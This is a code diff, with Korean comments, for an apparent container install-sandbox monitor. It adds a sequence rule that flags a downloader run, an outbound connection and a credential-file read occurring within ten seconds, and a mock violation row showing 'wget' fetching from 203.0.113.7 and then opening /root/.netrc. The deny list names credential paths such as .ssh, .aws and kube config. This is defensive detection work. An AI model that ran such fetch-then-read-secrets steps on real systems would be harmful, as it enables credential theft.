@@ -81,6 +81,14 @@
     { id: 'sandbox-dns', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 도메인 질의 자체를 격리 (연결 전 유출 · DNS 터널링 차단). sg-vm 실측 전까지 시험 운영', kind: 'dns', action: 'kill', dryRun: true, containers: ['sg-install-*'],
       allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'static.crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
       maxLabelLength: 40 },
+    // 연쇄 규칙(kind: sequence) [11/04] — default.yaml 끝(sandbox-dns 뒤)과 같은 값. 단계는 kind + 조건만.
+    //   목업 엔진(evaluate)은 kind 가 다른 규칙을 건너뛰어 연쇄를 평가하지 않는다(상태 있는 시뮬레이션 없음) — 표시 · 편집 확인용
+    { id: 'chain-download-secrets', description: '같은 컨테이너에서 10초 안에 다운로더 실행 → 외부 연결 → 자격 증명 파일 접근(하나씩은 약한 신호라도 이어지면 유출 시도). sg-vm 실측 전까지 시험 운영', kind: 'sequence', action: 'kill', dryRun: true, windowSeconds: 10,
+      steps: [
+        { kind: 'exec', denyComms: ['curl', 'wget'] },
+        { kind: 'connect', allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] }, // 내부망이 아닌 목적지(포트 무관)
+        { kind: 'open', denyPaths: ['/etc/shadow', '/root/.ssh/', '/home/*/.ssh/*', '/root/.aws/', '/var/run/secrets/', '/run/secrets/', '/root/.netrc', '/root/.git-credentials', '/root/.docker/config.json', '/root/.kube/config'] },
+      ] },
     // 시스템 규칙 [10/15 목표] — 차단 목록의 도메인을 집행한다. 정책 화면에서 직접 고치지 않고 차단 목록에서 관리한다
     { id: SYSTEM_RULE, description: '차단 목록의 도메인으로 나가는 연결 (차단 목록에서 관리)', kind: 'connect', action: 'kill', denyHosts: [] },
   ];
@@ -330,6 +338,16 @@
     }
     // 설치 세션 위반 — 같은 이벤트가 n 번이면 n 행(백엔드는 이벤트마다 저장)
     for (const s of installs || []) for (const v of s.violations) for (let k = 0; k < (v.count || 1); k++) { const row = Object.assign({}, v, { caseId: null }); delete row.count; rows.push(row); }
+    // 연쇄 규칙 시드 1행 [11/04] — 판정 JSON 의 sequence 는 backend model.SequenceHit 모양({ruleId, action, dryRun, steps[{kind, timestamp, comm, pid, detail}]}), 사유는 백엔드 문구.
+    //   시연처럼 no-shell-download 를 dryRun 으로 둔 상황을 가정하고 앞 단계(그때는 위반이 아님)는 넣지 않는다. 난수를 쓰지 않아 다른 시드 값은 그대로
+    {
+      const c = containers[0], t0 = now - 95 * 60000, at = (ms) => new Date(t0 + ms).toISOString();
+      const step = (kind, ms, comm, pid, detail) => ({ kind, timestamp: at(ms), comm, pid, detail });
+      const steps = [step('exec', 0, 'wget', 2417, 'wget -q -O /tmp/.cache http://203.0.113.7/x'), step('connect', 2100, 'wget', 2417, '203.0.113.7:80'), step('open', 2400, 'node', 2011, '/root/.netrc')];
+      rows.push({ event: { kind: 'open', comm: 'node', timestamp: at(2400), containerId: cids[0], containerName: c.name, imageName: c.image, pid: 2011, path: '/root/.netrc' },
+        matched: true, ruleId: 'chain-download-secrets', action: 'kill', dryRun: true, reason: '연쇄 3단계(10초 안): exec wget → connect 203.0.113.7:80 → open /root/.netrc · 2.4초',
+        sequence: { ruleId: 'chain-download-secrets', action: 'kill', dryRun: true, steps }, caseId: null, install: null });
+    }
     // 최신순, id 는 시간 오름차순이 되도록 다시 매긴다
     rows.sort((a, b) => new Date(a.event.timestamp) - new Date(b.event.timestamp));
     rows.forEach((r, i) => { r.id = i + 1; });
